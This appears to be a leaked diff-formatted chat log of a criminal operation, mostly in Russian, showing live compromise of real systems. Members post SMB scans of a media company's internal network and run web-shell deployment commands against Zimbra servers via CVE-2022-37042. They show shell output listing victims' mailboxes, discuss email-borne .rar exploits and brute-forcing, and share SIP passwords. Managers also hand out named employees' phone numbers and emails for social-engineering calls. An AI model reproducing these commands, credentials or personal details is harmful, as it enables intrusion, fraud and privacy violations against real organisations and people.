+SMB         192.168.11.6    445    KUBA1            [*] Unix (name:KUBA1) (domain:notes) (signing:False) (SMBv1:True)
+SMB         192.168.11.4    445    KUBA4            [*] Windows 10.0 Build 22621 x64 (name:KUBA4) (domain:KUBA4) (signing:False) (SMBv1:False)
+SMB         192.168.11.3    445    KUBA-RAS         [*] Windows 10.0 Build 20348 x64 (name:KUBA-RAS) (domain:KUBA-RAS) (signing:False) (SMBv1:False)
+SMB         192.168.11.7    445    KUBAVM           [*] Windows 6.1 Build 0 (name:KUBAVM) (domain:KUBAVM) (signing:False) (SMBv1:False)
+SMB         192.168.11.90   445    MULTIMEDIA-PC2   [*] Windows 10.0 Build 22621 x64 (name:MULTIMEDIA-PC2) (domain:MULTIMEDIA-PC2) (signing:False) (SMBv1:False)
+```
+--------------------
+[2024-04-05 12:48:29] @usernamess:matrix.bestflowers247.online: GG: вот эта с сеткой
+--------------------
+[2024-04-05 12:48:34] @usernamegg:matrix.bestflowers247.online: ++
+--------------------
+[2024-04-05 12:48:35] @usernamess:matrix.bestflowers247.online: > <@usernamegg:matrix.bestflowers247.online> `python3 shell.py --base_url="zimbraAdmin/public/jsp" --web_shell_filename="ZimbraAdmin.jsp" --key acspslnplzrdxpgddmcbrsktkatsdknj --target https://103.247.226.208`
+
+!
+--------------------
+[2024-04-05 12:49:57] @usernamess:matrix.bestflowers247.online: ```
+$ ip route
+default via 10.12.1.1 dev eth0 proto static metric 100
+$ cat /etc/resolv.conf
+# Generated by NetworkManager
+search tvonenews.com
+nameserver 10.12.1.208
+nameserver 8.8.8.8
+```
+
+
+--------------------
+[2024-04-05 12:50:22] @usernamegg:matrix.bestflowers247.online: это по какой ?
+--------------------
+[2024-04-05 12:50:32] @usernamess:matrix.bestflowers247.online: gj gjcktlytq
+--------------------
+[2024-04-05 12:50:37] @usernamess:matrix.bestflowers247.online: * по последней
+--------------------
+[2024-04-05 12:50:39] @usernamess:matrix.bestflowers247.online: там есть сетка
+--------------------
+[2024-04-05 12:50:39] @usernamegg:matrix.bestflowers247.online: ++
+--------------------
+[2024-04-05 12:50:47] @usernamess:matrix.bestflowers247.online: ```
+SMB         10.12.1.5       445    SAMURAI          [*] Windows Server 2003 3790 Service Pack 2 (name:SAMURAI) (domain:tvone.co.id) (signing:False) (SMBv1:True)
+SMB         10.12.1.17      445    IRONMAN          [*] Windows Server (R) 2008 Standard 6002 Service Pack 2 x64 (name:IRONMAN) (domain:tvone.co.id) (signing:False) (SMBv1:True)
+SMB         10.12.1.18      445    TVONEWEB         [*] Windows Server 2003 3790 Service Pack 2 x32 (name:TVONEWEB) (domain:tvone.co.id) (signing:False) (SMBv1:True)
+SMB         10.12.1.30      445    WEBMAIL          [*] Windows Server 2003 R2 3790 Service Pack 2 x32 (name:WEBMAIL) (domain:tvone.co.id) (signing:True) (SMBv1:True)
+SMB         10.12.1.20      445    HCDONE           [*] Windows Server (R) 2008 Standard 6002 Service Pack 2 x64 (name:HCDONE) (domain:hcdone) (signing:False) (SMBv1:True)
+SMB         10.12.1.35      445    TVONE-SVR-MAIL   [*] Windows Server 2008 R2 Enterprise 7601 Service Pack 1 x64 (name:TVONE-SVR-MAIL) (domain:tvone.co.id) (signing:True) (SMBv1:True)
+SMB         10.12.1.50      445    TVONE-SVR-DHCP   [*] Windows Server (R) 2008 Standard 6002 Service Pack 2 x64 (name:TVONE-SVR-DHCP) (domain:tvone.co.id) (signing:False) (SMBv1:True)
+SMB         10.12.1.57      445    VICTORY          [*] Windows Server 2008 R2 Standard 7601 Service Pack 1 x64 (name:VICTORY) (domain:tvone.co.id) (signing:False) (SMBv1:True)
+SMB         10.12.1.66      445    SNAKESYS         [*] Windows 5.1 x32 (name:SNAKESYS) (domain:tvone.co.id) (signing:False) (SMBv1:True)
+SMB         10.12.1.67      445    TVONE-SVR-TE     [*] Windows Server 2008 R2 Standard 7601 Service Pack 1 x64 (name:TVONE-SVR-TE) (domain:tvone.co.id) (signing:False) (SMBv1:True)
+SMB         10.12.1.33      445    STORM            [*] Windows Server 2003 3790 Service Pack 2 (name:STORM) (domain:tvone.co.id) (signing:False) (SMBv1:True)
+SMB         10.12.1.76      445    HCMSONE          [*] Windows Server 2008 R2 Standard 7601 Service Pack 1 x64 (name:HCMSONE) (domain:tvone.co.id) (signing:False) (SMBv1:True)
+SMB         10.12.1.75      445    TVONE-SVR-DB     [*] Windows Server 2008 R2 Standard 7601 Service Pack 1 x64 (name:TVONE-SVR-DB) (domain:tvone.co.id) (signing:False) (SMBv1:True)
+SMB         10.12.1.78      445    ABSEN            [*] Windows 10 Pro 19045 x64 (name:ABSEN) (domain:tvone.co.id) (signing:False) (SMBv1:True)
+SMB         10.12.1.32      445    MAILONE          [*] Windows Server 2003 3790 Service Pack 2 (name:MAILONE) (domain:tvone.co.id) (signing:False) (SMBv1:True)
+SMB         10.12.1.28      445    SVR-DC01         [*] Windows 10.0 Build 20348 (name:SVR-DC01) (domain:tvone.co.id) (signing:True) (SMBv1:False)
+SMB         10.12.1.84      445    SVR-DC03         [*] Windows 6.1 Build 7601 x64 (name:SVR-DC03) (domain:tvone.co.id) (signing:True) (SMBv1:False)
+SMB         10.12.1.82      445    SVR-DC02         [*] Windows 10.0 Build 20348 x64 (name:SVR-DC02) (domain:tvone.co.id) (signing:True) (SMBv1:False)
+SMB         10.12.1.77      445    WEBLOGGERONE     [*] Windows 5.1 x32 (name:WEBLOGGERONE) (domain:tvone.co.id) (signing:False) (SMBv1:False)
+SMB         10.12.1.81      445    TVONE-SVRWEB     [*] Windows 6.2 Build 9200 (name:TVONE-SVRWEB) (domain:tvone.co.id) (signing:False) (SMBv1:False)
+SMB         10.12.1.109     445    SVR-PANDORA      [*] Windows Server 2019 Standard 17763 x64 (name:SVR-PANDORA) (domain:tvone.co.id) (signing:False) (SMBv1:True)
+SMB         10.12.1.111     445    ACCBASE          [*] Windows Server 2012 R2 Standard 9600 x64 (name:ACCBASE) (domain:tvone.co.id) (signing:False) (SMBv1:True)
+SMB         10.12.1.15      445    ACNWINSHARE      [*] Windows 6.1 Build 0 (name:ACNWINSHARE) (domain:tvone.co.id) (signing:False) (SMBv1:False)
+SMB         10.12.1.58      445    DB               [*] Windows 6.1 Build 0 (name:DB) (domain:DB) (signing:False) (SMBv1:False)
+SMB         10.12.1.80      445    SVR-AD01         [*] Windows 6.3 Build 9600 (name:SVR-AD01) (domain:tvone.co.id) (signing:True) (SMBv1:False)
+SMB         10.12.1.85      445    PRODUCTION       [*] Windows 6.1 Build 0 (name:PRODUCTION) (domain:) (signing:False) (SMBv1:False)
+SMB         10.12.1.100     445    FILEZ            [*] Windows 6.1 Build 0 (name:FILEZ) (domain:tvone.co.id) (signing:False) (SMBv1:False)
+SMB         10.12.1.170     445    THOR             [*] Windows Server 2008 R2 Standard 7601 Service Pack 1 x64 (name:THOR) (domain:tvone.co.id) (signing:False) (SMBv1:True)
+SMB         10.12.1.115     445    SVR-TM           [*] Windows 10.0 Build 20348 (name:SVR-TM) (domain:tvone.co.id) (signing:False) (SMBv1:False)
+SMB         10.12.1.186     445    DSK-LIBPROG1200  [*] Windows 10 Pro for Workstations 19045 x64 (name:DSK-LIBPROG1200) (domain:tvone.co.id) (signing:False) (SMBv1:True)
+SMB         10.12.1.105     445    PROCUREMENT      [*] Windows 6.1 Build 0 (name:PROCUREMENT) (domain:tvone.co.id) (signing:False) (SMBv1:False)
+SMB         10.12.1.199     445    TVONE-SVN        [*] Windows Server 2008 R2 Standard 7601 Service Pack 1 x64 (name:TVONE-SVN) (domain:tvone.co.id) (signing:False) (SMBv1:True)
+SMB         10.12.1.168     445    SVR-APIONE       [*] Windows 6.1 Build 7601 (name:SVR-APIONE) (domain:svr-apione) (signing:False) (SMBv1:False)
+SMB         10.12.1.205     445    SVR-AD02         [*] Windows Server 2012 R2 Datacenter 9600 (name:SVR-AD02) (domain:tvone.co.id) (signing:True) (SMBv1:True)
+SMB         10.12.1.147     445    FTP              [*] Windows 6.1 Build 0 (name:FTP) (domain:tvone.co.id) (signing:False) (SMBv1:False)
+SMB         10.12.1.219     445    DSK-STREAM930    [*] Windows 10.0 Build 19041 (name:DSK-STREAM930) (domain:DSK-STREAM930) (signing:False) (SMBv1:False)
+```
+--------------------
+[2024-04-05 12:53:39] @usernamegg:matrix.bestflowers247.online: hashroot.com ?
+--------------------
+[2024-04-05 12:54:02] @usernamess:matrix.bestflowers247.online: `tvonenews.com`
+--------------------
+[2024-04-05 12:54:37] @usernamess:matrix.bestflowers247.online: `https://www.zoominfo.com/c/tvone/461584807`
+--------------------
+[2024-04-05 12:55:16] @usernamegg:matrix.bestflowers247.online: cooperhotels.com ?
+--------------------
+[2024-04-05 12:55:33] @usernamess:matrix.bestflowers247.online: что ты это скидываешь?
+--------------------
+[2024-04-05 12:57:51] @usernamegg:matrix.bestflowers247.online: он предлогает такое
+--------------------
+[2024-04-05 12:57:58] @usernamegg:matrix.bestflowers247.online: думаю смысла нет
+--------------------
+[2024-04-05 12:58:39] @usernamess:matrix.bestflowers247.online: ага
+--------------------
+[2024-04-05 12:58:40] @usernamess:matrix.bestflowers247.online: мелкие
+--------------------
+[2024-04-05 12:58:50] @usernamess:matrix.bestflowers247.online: вчера же скидывал я
+--------------------
+[2024-04-05 13:12:42] @usernameyy:matrix.bestflowers247.online: у нас расход?
+--------------------
+[2024-04-05 13:19:09] @n3auxaxl:matrix.collectionofmanager.space: кароче работает сплойт
+--------------------
+[2024-04-05 13:19:22] @n3auxaxl:matrix.collectionofmanager.space: не на всех но работает
+--------------------
+[2024-04-05 13:20:06] @usernamegg:matrix.bestflowers247.online: +++
+--------------------
+[2024-04-05 13:20:08] @usernamegg:matrix.bestflowers247.online: збс
+--------------------
+[2024-04-05 13:20:16] @usernamegg:matrix.bestflowers247.online: кого то отпустил
+--------------------
+[2024-04-05 13:20:18] @n3auxaxl:matrix.collectionofmanager.space: ```
+check -> https://3.76.248.43:443/zimbraAdmin/ZimbraAdmin.jsp
+https://3.76.248.43:443/zimbraAdmin/ZimbraAdmin.jsp
+Shell is active!
+$ ip a
+https://3.76.248.43:443/zimbraAdmin/ZimbraAdmin.jsp
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+inet 127.0.0.1/8 scope host lo
+valid_lft forever preferred_lft forever
+inet6 ::1/128 scope host
+valid_lft forever preferred_lft forever
+2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc mq state UP group default qlen 1000
+link/ether 02:60:61:b7:22:a3 brd ff:ff:ff:ff:ff:ff
+inet 172.26.10.51/20 brd 172.26.15.255 scope global dynamic eth0
+valid_lft 3094sec preferred_lft 3094sec
+inet6 2a05:d014:c88:3e00:1ce3:9269:ba1f:29dc/128 scope global dynamic
+valid_lft 448sec preferred_lft 138sec
+inet6 fe80::60:61ff:feb7:22a3/64 scope link
+valid_lft forever preferred_lft forever
+$ /opt/zimbra/bin/zmprov -l gaa
+https://3.76.248.43:443/zimbraAdmin/ZimbraAdmin.jsp
+admin@mail.met3r.com
+spam.ipg0rzcp@mail.met3r.com
+ham.57ldpsvc@mail.met3r.com
+virus-quarantine.5jtrtczpz@mail.met3r.com
+galsync.mjygfbhdu@mail.met3r.com
+jerry@mail.met3r.com
+galsync@met3r.com
+koosmandula@met3r.com
+jerry@met3r.com
+tom@met3r.com
+botond@met3r.com
+richard@met3r.com
+lajos@met3r.com
+```
+--------------------
+[2024-04-05 13:20:21] @usernamegg:matrix.bestflowers247.online: ты тоже пока не нужен
+--------------------
+[2024-04-05 13:20:40] @n3auxaxl:matrix.collectionofmanager.space: вот маленькая но все же
+--------------------
+[2024-04-05 13:21:12] @n3auxaxl:matrix.collectionofmanager.space: щас тут настрою все
+--------------------
+[2024-04-05 13:21:26] @n3auxaxl:matrix.collectionofmanager.space: а то их шел не проливается почему то сразу
+--------------------
+[2024-04-05 13:21:36] @n3auxaxl:matrix.collectionofmanager.space: пришлось свой небольшой написать
+--------------------
+[2024-04-05 13:21:47] @n3auxaxl:matrix.collectionofmanager.space: щас доделаю его
+--------------------
+[2024-04-05 13:22:02] @n3auxaxl:matrix.collectionofmanager.space: чтобы проливать их шел можно было
+--------------------
+[2024-04-05 13:22:13] @n3auxaxl:matrix.collectionofmanager.space: чтобы не писать много всего
+--------------------
+[2024-04-05 13:22:26] @usernameyy:matrix.bestflowers247.online: ну всё я поехал тогда))
+--------------------
+[2024-04-05 13:22:44] @n3auxaxl:matrix.collectionofmanager.space: до вечера разбрусь с этим всем
+--------------------
+[2024-04-05 13:23:05] @n3auxaxl:matrix.collectionofmanager.space: скину тебе такой же список
+--------------------
+[2024-04-05 13:23:30] @n3auxaxl:matrix.collectionofmanager.space: чтобы можно был по корпам сразу выбирать
+--------------------
+[2024-04-05 13:24:47] @n3auxaxl:matrix.collectionofmanager.space: Братец, а сможешь пожалуйста 6к закинуть, а то за серваки надо заплатить и у меня уже бабок нет почти, дохера очень ушло на эти операции, лекарства, реабилитации, вытрусили полностью)
+--------------------
+[2024-04-05 13:25:41] @n3auxaxl:matrix.collectionofmanager.space: bc1q659tnrk0dm7c9x2c93wfqfcm87glqfqjudfz6h
+--------------------
+[2024-04-05 13:25:50] @n3auxaxl:matrix.collectionofmanager.space: вот бит если можешь пожалуйста
+--------------------
+[2024-04-05 13:25:58] @n3auxaxl:matrix.collectionofmanager.space: заранее спасибо
+--------------------
+[2024-04-05 13:28:08] @n3auxaxl:matrix.collectionofmanager.space: пошел дальше заниматься сплойтом
+--------------------
+[2024-04-05 13:55:54] @iamnurnazarov:matrix.org: добрый день
+--------------------
+[2024-04-05 13:57:50] @manager361:colorado.su: Добрый
+--------------------
+[2024-04-05 14:01:38] @arslanshabbirmalik:matrix.org: Hello sir.
+--------------------
+[2024-04-05 14:01:44] @arslanshabbirmalik:matrix.org: Good morning
+--------------------
+[2024-04-05 14:02:06] @arslanshabbirmalik:matrix.org: Yes sir. I am ready
+--------------------
+[2024-04-05 14:36:39] @manager880:colorado.su: 
+нужно заменить sip аккаунт
+--------------------
+[2024-04-05 14:37:09] @iamnurnazarov:matrix.org: в zoiper?
+--------------------
+[2024-04-05 14:37:20] @manager880:colorado.su: да
+--------------------
+[2024-04-05 14:37:26] @manager880:colorado.su: удали пока имеющийс
+--------------------
+[2024-04-05 14:37:30] @manager880:colorado.su: * удали пока имеющийся
+--------------------
+[2024-04-05 14:37:52] @iamnurnazarov:matrix.org: хорошо
+--------------------
+[2024-04-05 14:38:10] @manager880:colorado.su: We need to change SIP account.
+--------------------
+[2024-04-05 14:38:48] @arslanshabbirmalik:matrix.org: Yes madam.
+--------------------
+[2024-04-05 14:38:57] @arslanshabbirmalik:matrix.org: I change it
+--------------------
+[2024-04-05 14:41:07] @arslanshabbirmalik:matrix.org: 20240405_194037_6544719241003529241.jpg
+--------------------
+[2024-04-05 14:42:23] @manager880:colorado.su: delete all previous accounts
+--------------------
+[2024-04-05 14:42:42] @arslanshabbirmalik:matrix.org: Received madam.
+--------------------
+[2024-04-05 14:43:21] @manager880:colorado.su: USERNAME: 459100-101
+SERVER: pbx.zadarma.com
+PASSWORD: arslan666
+--------------------
+[2024-04-05 14:43:31] @manager880:colorado.su: this is new details
+--------------------
+[2024-04-05 14:45:37] @manager880:colorado.su: USERNAME: 459100-102@pbx.zadarma.com
+PASSWORD: paul6666
+--------------------
+[2024-04-05 14:45:58] @manager880:colorado.su: добавь попробуй. Возможно изза РФ айпи могут быть проблемы
+--------------------
+[2024-04-05 14:46:27] @iamnurnazarov:matrix.org: ок, сейчас
+--------------------
+[2024-04-05 14:46:53] @arslanshabbirmalik:matrix.org: Madam, I have changed it to new account
+--------------------
+[2024-04-05 14:47:03] @arslanshabbirmalik:matrix.org: 20240405_194625_1870822831075116698.mp4
+--------------------
+[2024-04-05 14:47:57] @manager361:colorado.su: You sip is online now?
+--------------------
+[2024-04-05 14:48:21] @arslanshabbirmalik:matrix.org: Yes sir.
+--------------------
+[2024-04-05 14:48:40] @arslanshabbirmalik:matrix.org: 20240405_194830_8624781129852003780.jpg
+--------------------
+[2024-04-05 14:49:00] @manager880:colorado.su: left bottom corner please
+--------------------
+[2024-04-05 14:49:04] @manager880:colorado.su: it should be green status
+--------------------
+[2024-04-05 14:49:25] @manager361:colorado.su: https://docs.google.com/spreadsheets/d/1mDj1eaDc3BLDd3N8W-FHKBLRlcsopAofR_k79iV3XPU/edit#gid=0
+--------------------
+[2024-04-05 14:50:01] @manager880:colorado.su: там при проверке 4 протокола
+TLS
+TCP
+UDP
+xxx
+--------------------
+[2024-04-05 14:50:07] @arslanshabbirmalik:matrix.org: > <@manager880:colorado.su> it should be green status
+
+Madam I check
+--------------------
+[2024-04-05 14:50:10] @manager880:colorado.su: чтото такое.
+один как минимум зеленый должен быть
+--------------------
+[2024-04-05 14:51:24] @manager361:colorado.su: > <@manager361:colorado.su> https://docs.google.com/spreadsheets/d/1mDj1eaDc3BLDd3N8W-FHKBLRlcsopAofR_k79iV3XPU/edit#gid=0
+
+The task of matching the name
+Reminder.
+If there was a conversation with a real person write Picked Up in the comments.
+--------------------
+[2024-04-05 14:51:37] @arslanshabbirmalik:matrix.org: 20240405_195014_8045309420713417697.mp4
+--------------------
+[2024-04-05 14:51:49] @arslanshabbirmalik:matrix.org: > <@manager361:colorado.su> The task of matching the name
+> Reminder.
+> If there was a conversation with a real person write Picked Up in the comments.
+
+Received sir
+--------------------
+[2024-04-05 14:52:23] @iamnurnazarov:matrix.org: > <@manager880:colorado.su> USERNAME: 459100-102@pbx.zadarma.com
+> PASSWORD: paul6666
+
+на сервер прошлый ставлю?
+--------------------
+[2024-04-05 14:52:52] @manager880:colorado.su: не понял
+--------------------
+[2024-04-05 14:53:02] @manager880:colorado.su: в зойпере просто добавляй новый акк
+--------------------
+[2024-04-05 14:53:06] @manager880:colorado.su: данные что я дал введи
+--------------------
+[2024-04-05 14:53:11] @manager880:colorado.su: на первом экране
+--------------------
+[2024-04-05 14:53:17] @manager880:colorado.su: и потом Далее, Далее
+--------------------
+[2024-04-05 14:53:20] @manager880:colorado.su: скип помоему
+--------------------
+[2024-04-05 14:53:28] @manager880:colorado.su: > <@manager880:colorado.su> USERNAME: 459100-102@pbx.zadarma.com
+> PASSWORD: paul6666
+
+ничего не надо больше вводить
+--------------------
+[2024-04-05 14:53:30] @manager880:colorado.su: все по дефолту
+--------------------
+[2024-04-05 14:53:50] @iamnurnazarov:matrix.org: image.png
+--------------------
+[2024-04-05 14:53:54] @manager361:colorado.su: What account do you have online right now?
+--------------------
+[2024-04-05 14:53:57] @manager880:colorado.su: некст
+--------------------
+[2024-04-05 14:54:20] @iamnurnazarov:matrix.org: всё ок, нашлось
+--------------------
+[2024-04-05 14:54:36] @iamnurnazarov:matrix.org: image.png
+--------------------
+[2024-04-05 14:54:52] @manager880:colorado.su: отлично
+--------------------
+[2024-04-05 14:55:00] @manager880:colorado.su: попробуй набери куданибудь на всякий случай
+--------------------
+[2024-04-05 14:55:04] @manager880:colorado.su: пицца ницца
+--------------------
+[2024-04-05 14:55:10] @iamnurnazarov:matrix.org: ок ок
+--------------------
+[2024-04-05 14:55:28] @manager361:colorado.su: > <@manager361:colorado.su> https://docs.google.com/spreadsheets/d/1mDj1eaDc3BLDd3N8W-FHKBLRlcsopAofR_k79iV3XPU/edit#gid=0
+
+Get to the task at hand please, and don't forget our last conversation.
+--------------------
+[2024-04-05 14:56:02] @arslanshabbirmalik:matrix.org: 20240405_195540_2052414570466154569.jpg
+--------------------
+[2024-04-05 14:56:08] @arslanshabbirmalik:matrix.org: Sip 459100-101
+--------------------
+[2024-04-05 14:56:31] @arslanshabbirmalik:matrix.org: > <@manager361:colorado.su> Get to the task at hand please, and don't forget our last conversation.
+
+No problem sir. I remember your guidelines
+--------------------
+[2024-04-05 14:57:23] @manager880:colorado.su: ну и далее ожидай заданий
+--------------------
+[2024-04-05 14:57:37] @iamnurnazarov:matrix.org: хорошо, дайте знать
+--------------------
+[2024-04-05 14:58:28] @usernamegg:matrix.bestflowers247.online: ща
+--------------------
+[2024-04-05 14:59:18] @usernamegg:matrix.bestflowers247.online: сколько всего нашло уязвимых
+--------------------
+[2024-04-05 15:06:46] @n3auxaxl:matrix.collectionofmanager.space: по CVE-2022-37042 - 2 всего лишь
+--------------------
+[2024-04-05 15:06:55] @n3auxaxl:matrix.collectionofmanager.space: остальные пропатченые или open source edition
+--------------------
+[2024-04-05 15:06:59] @n3auxaxl:matrix.collectionofmanager.space: очень мало network edition
+--------------------
+[2024-04-05 15:07:35] @n3auxaxl:matrix.collectionofmanager.space: https://3.69.115.195:443/zimbraAdmin/0P3JCW.jsp
+https://3.76.248.43:8443/zimbraAdmin/0P3JCW.jsp
+--------------------
+[2024-04-05 15:07:40] @n3auxaxl:matrix.collectionofmanager.space: вот 2 шела тут пролито
+--------------------
+[2024-04-05 15:07:47] @n3auxaxl:matrix.collectionofmanager.space: там просто команду вводишь и вывод получаешь
+--------------------
+[2024-04-05 15:07:55] @n3auxaxl:matrix.collectionofmanager.space: могу туда пролить шел от того типа
+--------------------
+[2024-04-05 15:08:01] @n3auxaxl:matrix.collectionofmanager.space: я щас пытаюсь по другой уязвимости пробить
+--------------------
+[2024-04-05 15:08:10] @n3auxaxl:matrix.collectionofmanager.space: которая идет через отправку туда типо сообщения
+--------------------
+[2024-04-05 15:08:17] @n3auxaxl:matrix.collectionofmanager.space: я же домен могу узнать
+--------------------
+[2024-04-05 15:08:21] @n3auxaxl:matrix.collectionofmanager.space: там кароче они под SL идту
+--------------------
+[2024-04-05 15:08:45] @n3auxaxl:matrix.collectionofmanager.space: под SSL идут
+--------------------
+[2024-04-05 15:09:01] @n3auxaxl:matrix.collectionofmanager.space: и кароче можно получить доме, который к IP привязан
+--------------------
+[2024-04-05 15:09:03] @n3auxaxl:matrix.collectionofmanager.space: и все
+--------------------
+[2024-04-05 15:09:04] @n3auxaxl:matrix.collectionofmanager.space: и ты знаешь куда отправлять
+--------------------
+[2024-04-05 15:09:05] @n3auxaxl:matrix.collectionofmanager.space: там везде есть admin@domain.com
+--------------------
+[2024-04-05 15:09:08] @n3auxaxl:matrix.collectionofmanager.space: и туда шлю и все окей
+--------------------
+[2024-04-05 15:09:29] @n3auxaxl:matrix.collectionofmanager.space: по сути тот же запрос
+--------------------
+[2024-04-05 15:09:34] @n3auxaxl:matrix.collectionofmanager.space: только там наждо делать с .rar архивом
+--------------------
+[2024-04-05 15:09:47] @n3auxaxl:matrix.collectionofmanager.space: тот же сплойт, только там типо иждет проверка на вирусы и .rar распаковывается куда нам надо
+--------------------
+[2024-04-05 15:09:50] @n3auxaxl:matrix.collectionofmanager.space: и считай у нас етсь шел
+--------------------
+[2024-04-05 15:24:07] @n3auxaxl:matrix.collectionofmanager.space: всего таргетов нашло 112, которые прям норм по версии
+--------------------
+[2024-04-05 15:24:21] @n3auxaxl:matrix.collectionofmanager.space: но они либо пропатченые от данной уязвимости
+--------------------
+[2024-04-05 15:24:32] @n3auxaxl:matrix.collectionofmanager.space: либо open source edition
+--------------------
+[2024-04-05 15:24:59] @n3auxaxl:matrix.collectionofmanager.space: те, которые подходят по уязвимость по версии и патчу, я их пробил
+--------------------
+[2024-04-05 15:29:08] @manager361:colorado.su: Any problems?
+--------------------
+[2024-04-05 15:30:00] @usernamegg:matrix.bestflowers247.online: свой шелл пролил ?
+--------------------
+[2024-04-05 15:30:06] @usernamegg:matrix.bestflowers247.online: там как пасс менять юзерам ?
+--------------------
+[2024-04-05 15:30:17] @n3auxaxl:matrix.collectionofmanager.space: lf
+--------------------
+[2024-04-05 15:30:29] @n3auxaxl:matrix.collectionofmanager.space: щас сек
+--------------------
+[2024-04-05 15:31:02] @n3auxaxl:matrix.collectionofmanager.space: я тебе скину дост итпа мог залетать тудап, чтобы ты через шел того
+--------------------
+[2024-04-05 15:31:10] @n3auxaxl:matrix.collectionofmanager.space: щас сек
+--------------------
+[2024-04-05 15:31:12] @n3auxaxl:matrix.collectionofmanager.space: лагает инет
+--------------------
+[2024-04-05 15:31:13] @n3auxaxl:matrix.collectionofmanager.space: пару минут
+--------------------
+[2024-04-05 15:32:26] @arslanshabbirmalik:matrix.org: No sir. All the calls are voicemail. I am giving some time and make calls again
+--------------------
+[2024-04-05 15:35:05] @manager361:colorado.su: Start now please
+--------------------
+[2024-04-05 15:35:12] @arslanshabbirmalik:matrix.org: Yes sir
+--------------------
+[2024-04-05 15:37:34] @usernamegg:matrix.bestflowers247.online: ок
+--------------------
+[2024-04-05 15:42:20] @n3auxaxl:matrix.collectionofmanager.space: ```
+python3 shell.py --base_url="zimbraAdmin" --web_shell_filename="ZimbraAdmin.jsp" --key vbptxxwjdxsfrgzgeudtfffawmbcbhcx --target https://3.76.248.43:443
+```
+--------------------
+[2024-04-05 15:42:33] @n3auxaxl:matrix.collectionofmanager.space: я пролил туда шел от thinkabout
+--------------------
+[2024-04-05 15:42:35] @n3auxaxl:matrix.collectionofmanager.space: щас на второй полью
+--------------------
+[2024-04-05 15:42:41] @n3auxaxl:matrix.collectionofmanager.space: использование точно такое же
+--------------------
+[2024-04-05 15:49:22] @manager361:colorado.su: stop please
+--------------------
+[2024-04-05 15:49:51] @usernamegg:matrix.bestflowers247.online: они мелкие
+--------------------
+[2024-04-05 15:50:05] @n3auxaxl:matrix.collectionofmanager.space: ```
+python3 shell.py --base_url="zimbraAdmin" --web_shell_filename="ZimbraAdmin.jsp" --key vbptxxwjdxsfrgzgeudtfffawmbcbhcx --target https://3.69.115.195
+```
+--------------------
+[2024-04-05 15:50:10] @n3auxaxl:matrix.collectionofmanager.space: и вот еще 1
+--------------------
+[2024-04-05 15:51:28] @n3auxaxl:matrix.collectionofmanager.space: а остальные буду пытаться другими сплойтами ударить
+--------------------
+[2024-04-05 15:52:28] @n3auxaxl:matrix.collectionofmanager.space: я пролиюва 2 шела, его и свой
+--------------------
+[2024-04-05 15:52:34] @n3auxaxl:matrix.collectionofmanager.space: у меня там чисто команды, без всяких фич
+--------------------
+[2024-04-05 15:52:39] @n3auxaxl:matrix.collectionofmanager.space: он маленьки очень
+--------------------
+[2024-04-05 15:52:41] @n3auxaxl:matrix.collectionofmanager.space: но рабоатет
+--------------------
+[2024-04-05 15:53:01] @n3auxaxl:matrix.collectionofmanager.space: они другим сплойтом бьют это сто проц
+--------------------
+[2024-04-05 15:53:11] @n3auxaxl:matrix.collectionofmanager.space: потому что их шел не влазит в этот сплойт
+--------------------
+[2024-04-05 15:53:14] @n3auxaxl:matrix.collectionofmanager.space: слишком большой
+--------------------
+[2024-04-05 15:55:02] @lapa:matrix.bestflowers247.online: офнусь пока что... брут вот пока работает без ошибок. но монитрарю 200к потоков получилось поднять
+--------------------
+[2024-04-05 15:55:36] @lapa:matrix.bestflowers247.online: * офнусь пока что... брут вот пока работает без ошибок. 200к потоков получилось поднять
+--------------------
+[2024-04-05 15:56:21] @arslanshabbirmalik:matrix.org: Right sir.
+--------------------
+[2024-04-05 15:56:32] @arslanshabbirmalik:matrix.org: Any thing wrong sir on my end
+--------------------
+[2024-04-05 15:56:40] @manager361:colorado.su: go
+--------------------
+[2024-04-05 15:56:46] @arslanshabbirmalik:matrix.org: Ok
+--------------------
+[2024-04-05 16:15:52] @n3auxaxl:matrix.collectionofmanager.space: кароче да, еще раз попробовал пробить тем сплойтом таргеты, другими .рлами
+--------------------
+[2024-04-05 16:15:59] @n3auxaxl:matrix.collectionofmanager.space: * кароче да, еще раз попробовал пробить тем сплойтом таргеты, другими юрлами
+--------------------
+[2024-04-05 16:16:01] @n3auxaxl:matrix.collectionofmanager.space: не получилось
+--------------------
+[2024-04-05 16:16:19] @n3auxaxl:matrix.collectionofmanager.space: видимо уже пофиксили почти все тачки под тот сплойт
+--------------------
+[2024-04-05 16:16:35] @n3auxaxl:matrix.collectionofmanager.space: с отправкой письма думаю будет получше результат
+--------------------
+[2024-04-05 16:16:51] @manager361:colorado.su: Ideal Industries
+Description: Ideal Industries, founded in 1916 and headquartered in Sycamore, Illinois, manufactures tools and supplies for professional electrical and data communications cable installation.
+
+HQ Location: 1375 Park Ave Sycamore, Illinois 60178, United States
+Employees: 1,001 - 5,000
+Revenue: $679.5 Million
+Industry: Test & Measurement Equipment, Manufacturing, Manufacturing | Building Materials, Electronics
+
+
+HQ Phone (815) 895-5181 (HQ)
+
+
+
+---
+
+CALLLER
+Ted	Kowalczyk
+Information Technology Consultant
+(815) 895-1294
+ted.kowalczyk@idealindustries.com
+1375 Park Ave	Sycamore	Illinois	60178	United States
+
+OR
+
+Leilani	Askeland
+IT EDI Specialist
+(815) 895-1167
+leilani.askeland@idealindustries.com
+1375 Park Ave	Sycamore	Illinois	60178	United States
+
+OR
+
+Michelle	Fox
+Manager, Information Technology
+(815) 895-1344
+michelle.fox@idealindustries.com
+1375 Park Ave	Sycamore	Illinois	60178	United States
+
+--------------------
+[2024-04-05 16:16:58] @manager361:colorado.su: Alva Aguayo
+Senior Customer Service Representative
+(520) 364-6916
+aaguayo@velcro.com
+800 DeMuro Dr
+
+--------------------
+[2024-04-05 16:17:24] @manager361:colorado.su: Скажу через сколько набирать
+--------------------
+[2024-04-05 16:17:29] @manager361:colorado.su: Paul Miller: тут?
+--------------------
+[2024-04-05 16:26:00] @iamnurnazarov:matrix.org: извиняюсь
+--------------------
+[2024-04-05 16:26:09] @iamnurnazarov:matrix.org: на связи
+--------------------
+[2024-04-05 16:27:05] @manager361:colorado.su: можно звонить
+--------------------
+[2024-04-05 16:27:09] @manager361:colorado.su: > <@manager361:colorado.su> Alva Aguayo
+> Senior Customer Service Representative
+> (520) 364-6916
